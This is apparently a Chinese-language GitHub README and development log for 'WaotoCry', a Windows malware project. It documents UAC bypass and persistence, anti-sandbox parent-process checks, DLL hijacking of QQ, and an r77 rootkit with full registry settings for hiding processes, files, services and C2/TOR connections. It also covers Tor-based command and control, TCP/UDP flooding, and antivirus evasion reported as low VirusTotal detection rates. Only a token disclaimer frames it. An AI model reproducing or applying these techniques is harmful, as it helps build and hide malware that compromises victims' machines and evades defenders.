# Walcome To 0x7E9FB Team Project #
![FI](https://github.com/518651/0x7E9FB-Net-Project/blob/master/WaotoCry.png)
*项目的名字我暂时没有想好，你们可以去想想*

> 写在开头
		
	Attention:
	本文最终解释权归本项目开发者所有！！！
	由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，开发者不为此承担任何责任。

一切法律后果均由攻击者承担！！！


现在是2021/11/12 1:47:07 我已经对项目完成:


> Bypass.cpp

1. PROCESS对配置文件的AES加密工作[解密先放下]
 
  	 `调用函数--Encryption（char process_path）`
> Encryption.cpp

2. PROCESS对于目标设备进行的维持权限，及BYPASS+AV.[方法还是那个样子，注册表工作就不再说了]

	`调用函数--add_double_data`

	`调用函数--BypassUAC`


WAR:请注意若要对函数进行调用或者其他操作*add_double_data*及*BypassUAC*请把这两个函数当做一个函数，否则将提权失败

> Funtions.cpp


3.PROCESS的生成密码函数.原用于AES解密，但是我觉得有点多余因为文件是属于自己支配，无需目标做什么事.现在正在考虑RSA加密算法公钥/私钥生成行不行，如果不行此函数就要废弃
    `调用函数--Password`
 
> 以上是2021.11.11日的代码


----------


> 2021.11.12日

	[+]新增功能函数Anti Sendbox反沙箱

	Anti SendBox.cpp中
		
	第一步:[函数:Get_Parent_Processid]
	我调用了CreateToolhelp32Snapshot拍摄进程快照
		HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));
		FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
	然后使用了汇编语句进行传参
		_asm{
		push 0
		push 2
		call Address
		mov hkz, eax
		}
	再使用遍历返回父进程
	
	第二步写一个和上面差不多的结构获取Explorer.exe的PID[函数:Get_Explorer_process_id()]

	最后我让两者的PID进行对比[函数:determine()]
	if(Explorer_id==parent_id)
    如果我的函数在此返回的是--[1]--请各位开发者放行程序，反正请务必终结PROCESS，因为PROCESS已经在被执行逆向工程

	至此反沙箱/OD等逆向工程就写到这里，然后再看实战表现。	

	
 
> 下午11.12日17.38分

	程序现已经通过微步、VirusTotal两个在线云沙箱的考验
	
	成绩汇报:

----------


	微步在线云沙箱

	经微步云沙箱检测该文件为安全 分数:[10分]
	SHA256:9140f4c1bda5d74ac5019f6d3b0ebcb8e6cb9df8eca4ad47df60a96e83f13d3c
	多引擎检出率:1/25
	唯一高危行为:
	潜在进程注入目标explorer.exe
	
	最后分析下，此行为没法躲过去，除非换思路。


----------
	Virustotal

	SHA256:9140f4c1bda5d74ac5019f6d3b0ebcb8e6cb9df8eca4ad47df60a96e83f13d3c
	16 家安全供应商将此文件标记为恶意 多引擎检出率:16/66
	但是经过分析安全厂商未对PROCESS的注册表动作分析，得出PROCESS成功执行反逆向工程
	这里还有一个细节,被标记的安全厂商未有我们熟悉的.反之，阿里、百度、江民、卡巴斯基、迈克菲、微软、趋势科技、深信服零号、腾讯反病毒引擎全部PASS!!!!!!

	2021/11/12 19:17:36 
	空白给予思路，我们放弃对原来的MDD编译思路，换成不从Windows系统调用DLL改从PROCESS自身调用，大大减低触发的安全规则
	新FILE SHA256:5200e993cb05f638655945d6f85abd71db2740446bfa772e12b54cffb60c110d
	多引擎检出率:9/67
	
----------

## 下一步函数功能 ##

> 我在项目创建了一个**Connect.cpp**这个是给你们用于WEB服务器做交互用的

	个人认为你们可以写这些功能:
	1. 向WEB SERVER发起请求--获取公钥[这个公钥是RSA算法的保障，后期可以用作身份校验+文件签名.具有唯一性]
	2. 使用TOR组件通讯，这样我们可以做到--Anonymous--如果WEB组给力点，我们还可以拓展添加一个对TOR的Socket加密通讯
	3. 向SERVER请求下载配置文件
	4. 接收来自Control控制中心的行动指令:upload\upConfig.....
	5. 查看Config文件
	

----------

>反沙箱调试\OD等一切逆向工程

	反沙箱我这有一个很好的思路：我们直接检测PROCESS的父进程是不是Explorer.如果PROCESS进程不是Explorer直接判断程序正在被调试,然后执行EXIT就可以了	
	当然这里想的没那么全,你们看还有没有其他建议，提交--ISSUES--就行

	Attention-->这一步将作为整个项目的核心部分

> PROCESS行为检测

	反逆向模块虽然PASS，但是后期的行为检测也很重要.如果行为检测出问题就代表一切反AV手段全部前功尽弃.
	还是一样的，先说思路。我认为我如果把行为动作做简单高效点，不动高危函数应该没有问题.

> 网络流量检测
> 
	和MAIN SERVER进行的一切交流必须要经过伪装以达到普通进程的目的。这里我说下此函数最后要做成的效果:
	1. 不能暴露MAIN SERVER的IP地址	
	2. 一切通讯被拦截后，无法推断PROCESS的意图


	
## TIME:2021/11/12 17:54:15 完成对此模块的编写并成功PASS ##


----------

----------

> TIME:2021/11/14 11:54:43 
	
	项目的RELEASE[文件释放函数]正式完成
	此函数于11.13中午开始编写，足足卡了我一天的时间，不过好在终于写出来了
	
	函数介绍:
	
	函数名称:CreateEXE(char* strFilePath, int nResourceID, char* strResourceName)
	需要用到的参数名称分别为:文件释放的位置，函数的VS2019资源名称(注:上面的写的是INT类型但是我里面用了MAKEINTRESOURCE进行转型),文件类型.
	
	Use MAKEINTRESOURCE:
	_WaotoCry.get_process_dir= Get_Process_in_dir();
	_WaotoCry.Proconn_data= CreateEXE(_WaotoCry.get_process_dir, IDR_DLL1, (char *)"DLL");
	在Funtions.cpp中我写了一个获取当前目录的函数，这里用结构体中的_WaotoCry.Get_process_dir去接收数据
	CreateEXE里面的就是正式调用


----------

> TIME:2021/11/14 21:00:20 

	此次修改了:
			添加:
				通过进程名寻找PID
				获取PID对应的路径
			修复:
				AITI SENDBOX函数可进行多字节开发,不在限制于UNICDOE字符集.



----------

2021/11/15 0:01:32 
> [Attention重大事件]经过大佬的反馈，WaotoCry进攻模块将从原来的加载图片RGB值Shellcode变为白EXE+黑DLL方式躲开AV的检查
	
	WaotoCry将通过获取QQ进程PID读取路径进行释放DLL动态链接库，对原DLL进行改写,实现对DLL文件劫持。

----------
> TIME:2021/11/15 16:45:56 

	此次修改了:
			添加：
				[+]对于通过PID拿到的PATH路径我写一个拦截规则函数
					函数定义:string replace_string(string no_replace,string need_relace_string,string befor_replace);
					调用解析:参数1：需要一个string类型的原字符串，也就是没有更改的字符串 
							参数2：要对原字符串中什么数据进行规则匹配拦截
							参数3：拦截成功后你需要对他进行改写的内容是什么

	
		
			修改
				[-]对结构体的内容重新封装，使得调用起来能更好的兼容函数
				[-]对一些函数的参数统同样进行封装,及宽字节的兼容



----------
> TIME:2021/11/15 21:50:18  第二代WaotoCry正式完成
	
	最后对reanname进行编写后对main函数正式流程编写并封装加入攻击模块


----------


> TIME:2021/11/28 22:47:01  WaotoCry成功装载ROOTkit模块

	各位开发者们如果需要调用Rootkit就请使用InstallR77函数调用.

现在Rootkit支持一下隐藏功能:

隐藏任何带**$WaotoCry**前缀的*文件、路径、计划任务、注册表项和值、服务以及TCP 和 UDP 连接和!!!CPU使用率!!!*

配置WaotoCry的Rootkit模块:
请各位开发者们创建/写入注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig

如果你想隐藏PID(进程号)就请在上面的注册表路径下创建**pid项**,写入的数据格式:

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\pid
	
	1. 名称--WaotoCry
	2. 数据类型为--REG_DWORD
	3. 数值--0x000014f0(5360)

如果你想隐藏process_name(进程名称)就请在上面的注册表路径下创建**process_names项**,写入的数据格式:

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\process_names
	
	1. 名称--process_1
	2. 数据类型为--REG_SZ
	3. 数值--QQ.exe

如果你想隐藏注册表项和值(path\date)就请在上面的注册表路径下创建**$WaotoCry(项)\$WaotoCrymykey(值)**,写入的数据格式:

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\$WaotoCry
	
	1. 名称--$WaotoCry
	2. 数据类型为--REG_SZ
	3. 数值--$WaotoCry(隐藏的是所有注册表前缀值为$WaotoCry的项)

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\$WaotoCrymykey
	
	1. 名称--$WaotoCrymykey
	2. 数据类型为--REG_SZ
	3. 数值--$WaotoCrymykey(隐藏的是所有注册表前缀值为$WaotoCrymykey的值)




如果你想隐藏服务(Service)就请在上面的注册表路径下创建**service_names项**,写入的数据格式:

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\service_names
	
	1. 名称--HiddenServiceNames
	2. 数据类型为--REG_SZ
	3. 数值--WindowsOryouwanthidename(隐藏的是所有WindowsOryouwanthidename服务)

tcp_local
如果你想隐藏网络行为(network)就请在上面的注册表路径下创建**tcp_local(隐藏本地TCP连接)、tcp_remote(隐藏远程TCP连接)、udp**,写入的数据格式:

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\tcp_local
	
	1. 名称--WaotoCry_to_tor(隐藏WaotoCry和洋葱路由的连接)
	2. 数据类型为--REG_SZ
	3. 数值--9050(隐藏的是TOR在本地监听的端口)


	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\tcp_remote
	
	1. 名称--C2SERVER_TO_MY(隐藏WaotoCry的C2服务器对本地WaotoCry的连接)
	2. 数据类型为--REG_SZ
	3. 数值--4000(隐藏的是TOR在本地监听的端口)

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\udp
	
	1. 名称--WaotoCry_udp_config(隐藏指定的进、出UDP端口)
	2. 数据类型为--REG_SZ
	3. 数值--4001



如果你想启动进程(Start Process)就请在上面的注册表路径下创建**startup**,写入的数据格式:

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\startup
	
	1. 名称--WaotoCry_start_process(启动指定的进程)
	2. 数据类型为--REG_SZ
	3. 数值--C:\Process File(X86)\^Waoto_ep.exe


如果你想隐藏目录中的进程(DIR Process)就请在上面的注册表路径下创建**paths**,写入的数据格式:

	注册表路径:HKEY_LOCAL_MACHINE\SOFTWARE\$WaotoCryconfig\paths
	
	1. 名称--WaotoCry_hide_process(隐藏指定的目录下的进程)
	2. 数据类型为--REG_SZ
	3. 数值--C:\Process File(X86)\^Waoto_ep.exe



----------

> TIME:2021/12/8 3:06:32 

	此次新增函数:
	AES对于数据的加密、解密
	查询设备重要部件型号:CPU\GPU
	添加Sokcet客服端通讯代码

	后期添加对于自身的进程保护及R0环通讯代码


----------


> 开发日志:受到Log4j2 0day 的启发,本想对WaotoCry attack模块进行转型，但是在尝试对[Stsyem32]目录下dxgi.dll进行劫持的时候受到TrustedInstaller权限的阻挠,暂时停止对系统目录的劫持,择日选择一个新的劫持目标

	[新增函数:encrypt_vigenere,extend_key,drcryt_vigenere]

	
函数调用:
	
	encrypt_vigenere(待加密的数据,你的公钥);//加密

	extend_key(加密后的密文,公钥);//解密密钥生成

	decrypt_vigenere(加密后的密文,解密密钥); //解密
	
	

![](https://github.com/518651/0x7E9FB-Net-Project/blob/master/img/2NW%25%601JYAR2408%5B6U5%246EQP.png)


----------
TIME:2021/12/26 2:52:44 

抽了点时间更新WaotoCry项目,这次更新了TCP/UDP洪水饱和+C&C加密混淆通讯


![](https://github.com/518651/0x7E9FB-Net-Project/blob/master/img/20211226030540.png)


----------
TIME:2022/1/8 00:53:36

和GITBOY商议后续开发事宜后，我们决定暂时对WaotoCry.Beta v2 构建从开发转向后续维护更新,并同时筹备Beta V3架构开发工作,由于在线开发者无法到达预期的效果
,所以正在开始构建V3之前我们需要对团队进行一次大型扩充,招纳相关Red Team兴趣的伯乐一起开发WaotoCry.Beta v3工程.

	About WaotoCry.Beta V3 Someting

	Kerlen:	
	开发组一直认为WaotoCry.Beta V2版本的Kerlen相关工作没有实质性的推进.至今都是R3调R0 API.对于真正的HOOK Code没有任何编写.所以WaotoCry.Beta V3开发中将
	注重对Kernel的组件开发.

	Code Confusion:
	长期的逆向样本中,我们发现代码混淆技术对于躲避IDA等逆向手段有着强大的优势,这一点将纳入WaotoCry.Beta V3工程中.

	Avoidance Yara Rules:
	Yara规则毋庸置疑是现Anti VIRUS PROCESS/MANUFACTURER对于FILE 是否为恶意重要判定规则.WaotoCry.Beta V2中对此没有做太大修改，导致多次命中规则.在V3版本
	中会进行Anti YARA开发.

	WaotoCry Watchdog:
	若想要对WaotoCry在实验中长期生存维持权限,则需要一个"看门狗"用于周期性检测WaotoCry是否在正常运行\文件是否还在本地.若上述事件发生将重新拉起WaotoCry线程
	or 重新Release WaotoCry File.
	
	Attack: 
	V2中shellcode位于DLL文件中,其使用MSF一重生成,AV检测恶意成功率非常高,所以暂时定为对Shellcode模块在执行前进行异或加密,破坏生成特征,提高存活率.进入SRAM中
	则再开始与或成原Shellcode.

	